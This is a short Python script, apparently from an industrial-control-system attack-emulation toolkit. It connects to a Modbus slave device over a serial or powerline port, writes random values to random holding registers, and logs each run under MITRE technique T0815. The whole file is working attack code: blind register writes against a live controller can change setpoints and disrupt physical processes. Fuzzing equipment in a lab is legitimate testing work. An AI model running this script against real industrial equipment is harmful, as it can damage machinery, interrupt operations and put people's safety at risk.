#!/usr/bin/env python3

import minimalmodbus, time, argparse, random, json, os
from datetime import datetime

LOG_FILE = "results/powerline_modbus_fuzz_logs.json"
MITRE_TTP = "T0815"

def log_fuzz(entry):
    os.makedirs("results", exist_ok=True)
    if os.path.exists(LOG_FILE):
        with open(LOG_FILE) as f:
            existing = json.load(f)
    else:
        existing = []
    existing.append(entry)
    with open(LOG_FILE, "w") as f:
        json.dump(existing, f, indent=2)

def fuzz_target(port, addr, count=20):
    try:
        instrument = minimalmodbus.Instrument(port, addr)
        for _ in range(count):
            reg = random.randint(0, 100)
            val = random.randint(0, 65535)
            instrument.write_register(reg, val)
            time.sleep(0.1)
        return True
    except Exception as e:
        print(f"[!] Fuzz failed: {e}")
        return False

def main():
    parser = argparse.ArgumentParser(description="Fuzz Modbus over Powerline Devices")
    parser.add_argument("--port", required=True, help="Serial port (e.g., /dev/ttyUSB0)")
    parser.add_argument("--addr", type=int, default=1, help="Modbus slave address")
    parser.add_argument("--count", type=int, default=20, help="Fuzz iterations")
    args = parser.parse_args()

    result = fuzz_target(args.port, args.addr, args.count)
    log_fuzz({
        "timestamp": datetime.utcnow().isoformat(),
        "port": args.port,
        "slave": args.addr,
        "iterations": args.count,
        "success": result,
        "ttp": MITRE_TTP
    })

if __name__ == "__main__":
    main()
